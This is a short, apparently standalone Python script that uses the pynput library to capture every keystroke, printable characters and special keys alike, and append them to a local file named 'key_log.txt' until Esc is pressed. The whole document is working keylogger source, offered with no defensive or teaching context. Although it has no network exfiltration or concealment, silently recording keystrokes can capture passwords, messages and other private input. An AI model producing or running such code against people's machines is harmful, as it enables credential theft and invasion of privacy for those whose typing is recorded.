from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    """Function to log key presses"""
    try:
        with open(log_file, "a") as file:
            file.write(key.char)  # Log printable characters
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" {key} ")  # Log special keys (e.g., Shift, Enter)

def on_release(key):
    """Stops the keylogger when Esc is pressed"""
    if key == keyboard.Key.esc:
        print("Stopping keylogger...")
        return False  # Stop the listener

# Listener to capture keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
